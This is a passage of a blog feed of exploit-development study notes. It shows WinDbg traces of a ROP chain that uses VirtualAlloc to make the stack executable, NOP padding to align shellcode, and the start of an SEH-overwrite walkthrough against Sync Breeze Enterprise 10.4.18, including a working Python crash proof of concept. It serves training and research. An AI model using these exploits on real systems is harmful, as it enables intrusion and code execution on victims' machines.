<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span><span style="color:#ae81ff">8</span>b1c8 ecx<span style="color:#f92672">=</span>ffffffe8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50533</span>cbf esp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce424 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2ec iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x22e21</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50533</span>cbf <span style="color:#ae81ff">8</span>be5            mov     esp,ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span><span style="color:#ae81ff">8</span>b1c8 ecx<span style="color:#f92672">=</span>ffffffe8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50533</span>cc1 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2ec ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2ec iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x22e23</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50533</span>cc1 <span style="color:#ae81ff">5</span>d              pop     ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">026</span>ce2ec  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">76</span>a65680 <span style="color:#ae81ff">026</span>ce504 <span style="color:#ae81ff">026</span>ce504
</span></span></code></pre></div><p>We can see that the last pop ebp gadget we put is going to pop 41414141 (one of the dummy values we have inserted to reach EIP) into ebp and then esp is going to point to our desired address.:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd esp L1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">026</span>ce2f0  <span style="color:#ae81ff">76</span>a65680
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span><span style="color:#ae81ff">8</span>b1c8 ecx<span style="color:#f92672">=</span>ffffffe8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">76</span>a65680 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2f4 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
</span></span><span style="display:flex;"><span>KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">76</span>a65680 <span style="color:#ae81ff">8</span>bff            mov     edi,edi
</span></span></code></pre></div><p>Now let&rsquo;s see our shellcode address (top of stack, we are going to return to it after VirtualAlloc, remember we placed it on purpose). Let&rsquo;s see the protections:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> dd esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e2f4  <span style="color:#ae81ff">01</span>a0e504 <span style="color:#ae81ff">01</span>a0e504 <span style="color:#ae81ff">00000001</span> <span style="color:#ae81ff">00001000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>vprot <span style="color:#ae81ff">01</span>a0e504 
</span></span><span style="display:flex;"><span>BaseAddress:       <span style="color:#ae81ff">01</span>a0e000
</span></span><span style="display:flex;"><span>AllocationBase:    <span style="color:#ae81ff">01</span><span style="color:#ae81ff">970000</span>
</span></span><span style="display:flex;"><span>AllocationProtect: <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
</span></span><span style="display:flex;"><span>RegionSize:        <span style="color:#ae81ff">00062000</span>
</span></span><span style="display:flex;"><span>State:             <span style="color:#ae81ff">00001000</span>  MEM_COMMIT
</span></span><span style="display:flex;"><span>Protect:           <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
</span></span><span style="display:flex;"><span>Type:              <span style="color:#ae81ff">00020000</span>  MEM_PRIVATE
</span></span></code></pre></div><p>Let&rsquo;s execute VirtualProtect and see the protections again (we use pt here to stop until next return).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> pt
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e000 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>d4a7e8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e2c4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">755</span>ddf31 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e2f4 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>KERNELBASE<span style="color:#f92672">!</span>VirtualAlloc<span style="color:#f92672">+</span><span style="color:#ae81ff">0x51</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">755</span>ddf31 c21000          ret     <span style="color:#ae81ff">10</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>vprot <span style="color:#ae81ff">01</span>a0e504 
</span></span><span style="display:flex;"><span>BaseAddress:       <span style="color:#ae81ff">01</span>a0e000
</span></span><span style="display:flex;"><span>AllocationBase:    <span style="color:#ae81ff">01</span><span style="color:#ae81ff">970000</span>
</span></span><span style="display:flex;"><span>AllocationProtect: <span style="color:#ae81ff">00000004</span>  PAGE_READWRITE
</span></span><span style="display:flex;"><span>RegionSize:        <span style="color:#ae81ff">00001000</span>
</span></span><span style="display:flex;"><span>State:             <span style="color:#ae81ff">00001000</span>  MEM_COMMIT
</span></span><span style="display:flex;"><span>Protect:           <span style="color:#ae81ff">00000040</span>  PAGE_EXECUTE_READWRITE
</span></span><span style="display:flex;"><span>Type:              <span style="color:#ae81ff">00020000</span>  MEM_PRIVATE
</span></span></code></pre></div><p>Before executing the API, we find that the memory protection is PAGE_READWRITE. But after executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE.</p>
<h1 id="aligning-the-shellcode-with-our-return-address">Aligning the shellcode with our return address</h1>
<p>The final step is to align our shellcode with the return address.
Note: Instead of modifying the offsets used in the ROP chain (would be another method, once we know the offset, modify it) we could also insert several padding bytes before the shellcode.
We will do the second approach here.</p>
<p>To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the <strong>address of the first instruction we are executing on the stack.</strong>
Next, we dump the contents of the stack and <strong>obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.</strong>
We are basically forcing our shellcode to be in the address that we previously inserted in the ROP gadget chain. We just calculate the bytes that are missing from such address and add NOPs so that the shellcode starts in such address instead of just after the ROP chain.
<strong>Note: In Windows, the calling convention enforces that the called function decrements ESP to clear the stack arguments.</strong> In Linux, the caller function clears the argument after the flow its returned to it (with add esp, 8). Basically, windows does the &ldquo;add esp&rdquo; in the ret.
En español para que quede más claro: Al setear ESP con el dummy address que hemos puesto en el rop chain, ESP está muy abajo (o arriba) de nuestro shellcode. Nuestro shellcode en realidad está mas arriba (o abajo) de la pila. Hay que ver la diferencia en bytes y añadir NOPs para que la dirección de salto que hemos puesto en la ROP chain coincida justo donde empieza nuestro shellcode.</p>
<p>Let&rsquo;s see where we landed after executing VirtualAlloc:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> p
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e000 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>d4a7e8 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e2c4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e504 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span>a0e308 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e504 <span style="color:#ae81ff">43</span>              inc     ebx
</span></span></code></pre></div><p>eip = 0x01a0e504.
We can subtly see as the next instruction to execute is &ldquo;43&rdquo; meaning that we are jumping &ldquo;inside&rdquo; our shellcode. We have to jump to the start.</p>
<p>Let&rsquo;s see where does our ROP chain start:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> dd esp <span style="color:#f92672">+</span> <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e408  <span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">505115</span>a3 ffffffe8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e418  <span style="color:#ae81ff">5051579</span>a <span style="color:#ae81ff">5051571f</span> <span style="color:#ae81ff">50533</span>cbf <span style="color:#ae81ff">43434343</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">01</span>a0e424
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>a0e424  <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span><span style="color:#f92672">-</span><span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">43</span>  CCCCCCCCCCCCCCCC
</span></span></code></pre></div><p>Our shellcode starts in 0x01a0e424. Let&rsquo;s calculate the offset from EIP:</p>
<pre tabindex="0"><code>0:055&gt; ? 0x01a0e424 - 0x01a0e504
Evaluate expression: -224 = ffffff20
</code></pre><p>This means that we have to add 224 NOPs into our shellcode so the first starting byte is at address 0x01a0e504.
Our buffer starts fulfilling at 0x01a0e424, we will fill 224 nops and then the useful payload.
<strong>Note: the offset dummy value that we store in the stack must not be very big as it is better to have a small offset and then fix by adding NOPs in our shellcode rather than jumping further than our shellcode. The offset must be inside our shellcode, that&rsquo;s for sure, so we can put nops and fix it afterwards. If not, we have to change the offset manually.</strong></p>
<p>After sending the payload with the exact offset, we can see that EIP points to exactly our shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds eip
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">024</span>de504  cccccccc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dds eip <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">024</span>de503  cccccc43
</span></span></code></pre></div><p><strong>Note: the instruction CC (int 3, software breakpoint) has been executed in order to verify that everything works.</strong></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_seh_1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_seh_1/</guid>
      <description><![CDATA[<h1 id="analyzing-public-exploit">Analyzing public exploit</h1>
<ul>
<li>Vulnerable Binary: Sync Breeze Enterprise v10.4.18</li>
</ul>
<p>Let&rsquo;s try to use the public exploit to trigger a crash:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:  
</span></span><span style="display:flex;"><span> server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.122.113&#34;</span>  
</span></span><span style="display:flex;"><span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9121</span>  
</span></span><span style="display:flex;"><span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>  
</span></span><span style="display:flex;"><span> inputBuffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> size  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\x19\xba\xab</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x40\x00\x00</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, len(inputBuffer))  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, len(inputBuffer))  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, inputBuffer[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])  
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> header <span style="color:#f92672">+</span> inputBuffer  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)  
</span></span><span style="display:flex;"><span> s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>connect((server, port))  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>send(buf)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>close()  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Done!&#34;</span>)  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Could not connect!&#34;</span>)
</span></span></code></pre></div><p>When we execute the exploit, we see that the EAX register is overwritten, but not the EIP&hellip;
Seems like at this moment the EIP register is not directly under our control.
Also, there is some data in the stack that contains part of our payload:
<img src="content/images/post_images/osed_2.png" alt=""></p>
<p>Let&rsquo;s see all the registers and confirm that EAX is the only register under our control:
<img src="content/images/post_images/osed_2_1.png" alt=""></p>
<p>Let&rsquo;s examine the crash. The crash says:</p>
<pre tabindex="0"><code>(113c.1164): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
</code></pre><p>This means that the debugger intercepted a first chance exception, which is like a unexpected error.
Let&rsquo;s handle it continuing the program by pressing &ldquo;g&rdquo;.
We can see that we got another access violation, now controlling the EIP.
<img src="content/images/post_images/osed_2_2.png" alt=""></p>
<p>To understand how this exploit worked and how we got control over the EIP, we have to talk about the SEH.</p>
<h1 id="seh">SEH</h1>
<p>We must understand what happens when <strong>an exception occurs inside an application</strong>.
As mentioned in the previous section, exceptions are unexpected events that occur during normal program execution.
There are two kinds of exceptions: <strong>hardware exceptions and software exceptions</strong>.</p>
<ul>
<li>Hardware exceptions are initiated by the CPU. We encountered a typical hardware exception when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address. Hardware exceptions are exceptions that are not made by the programmer, but occur when the logic in the assembly code fails.</li>
<li>On the other hand, software exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. For example, a software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument. They are exceptions but controlled in the software layer.</li>
</ul>
<p><strong>Normally the exception handling is programmed via try/except blocks.</strong> In Windows, when doing a try/except block, the code will leverage the SEH (Structure Exception Handling) implemented by the Windows OS to handle the unexpected event.</p>
<p>SEH is implemented in <strong>the operative system (Windows)</strong> to manage <strong>what to do when an unexpected action occurs in the execution of a thread.</strong> When a thread faults, the OS calls a set of functions, called <strong>function handlers</strong>, which can correct the exception, provide more information about the unexpected condition, etc.
The <strong>exception handlers are user-defined and created during the creation of the try/except code blocks.</strong>
So, the SEH is the mechanism created by the OS that executes our exception handlers (created by developers) when an exception fails.
<strong>Important note: There is a special DEFAULT exception handler which is defined by the OS, the rest are programmed by the developer.</strong></p>
<p>When an unexpected event occurs, the OS must locates the correct exception handler.
Note that the exception handling occurs <strong>at a thread level.</strong>
Each thread in a program can be identified by a TEB (Thread Environment Block) structure, a struct that stores important information about such thread.
Each time a try block is found during the execution of a thread, a pointer to the <strong>corresponding exception handler is saved on the stack in the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure</strong>.
As there might be different try blocks chained in the single thread (a try inside a try), these structures are connected in the stack <strong>in a linked list</strong>, as the following image details:
<img src="content/images/post_images/osed_2_3.png" alt=""></p>
<p>In the case that the exception occurs, the OS inspects the TEB structure of the thread that has the exception and retrieves a pointer (<strong>ExceptionList</strong>) to the linked list of <code>_EXCEPTION_REGISTRATION_RECORD</code>.
How does the OS retrieves information of the TEB? Well, the FS register at offset 0 (<code>fs:[0]</code>) stores a pointer to the TEB structure of that thread.
After retrieving the Exception List, the OS will walk and <strong>invoke each of the exception handler functions stored in the stack until one of them can deal with the unexpected event.</strong> If none of the defined functions can handle the exception, the OS invokes the <strong>default exception handler, which is always the last node in the linked list. This exception handler terminates the current process (or thread if the application is a system service)</strong>.</p>
<p>TL; DR, the TEB of a thread has a pointer called ExceptionList that points to the linked list of <code>_EXCEPTION_REGISTRATION_RECORD</code> in the stack. The pointer is to the first exception, as the rest are chained by following the &ldquo;Next&rdquo; attribute of the exception. Each of these handlers is called to manage the exception when it occurs. If none of then can manage the exception, the program exits or the thread ends, in case of a service.</p>
<h2 id="seh-internals">SEH internals</h2>
<p>Let&rsquo;s analyze the TEB structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt nt<span style="color:#f92672">!</span>_TEB
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_TEB
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> NtTib            : _NT_TIB
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x01c</span> EnvironmentPointer : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x020</span> ClientId         : _CLIENT_ID
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x028</span> ActiveRpcHandle  : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x034</span> LastErrorValue   : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x038</span> CountOfOwnedCriticalSections : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x03c</span> CsrClientThread  : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x040</span> Win32ThreadInfo  : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x044</span> User32Reserved   : [<span style="color:#ae81ff">26</span>] Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0ac</span> UserReserved     : [<span style="color:#ae81ff">5</span>] Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c0</span> WOW32Reserved    : Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c4</span> CurrentLocale    : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c8</span> FpSoftwareStatusRegister : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0cc</span> ReservedForDebuggerInstrumentation : [<span style="color:#ae81ff">16</span>] Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x10c</span> SystemReserved1  : [<span style="color:#ae81ff">26</span>] Ptr32 Void
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x174</span> PlaceholderCompatibilityMode : Char
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x175</span> PlaceholderHydrationAlwaysExplicit : UChar
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x176</span> PlaceholderReserved : [<span style="color:#ae81ff">10</span>] Char
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x180</span> ProxiedProcessId : Uint4B
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x184</span> _ActivationStack : _ACTIVATION_CONTEXT_STACK
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x19c</span> WorkingOnBehalfTicket : [<span style="color:#ae81ff">8</span>] UChar
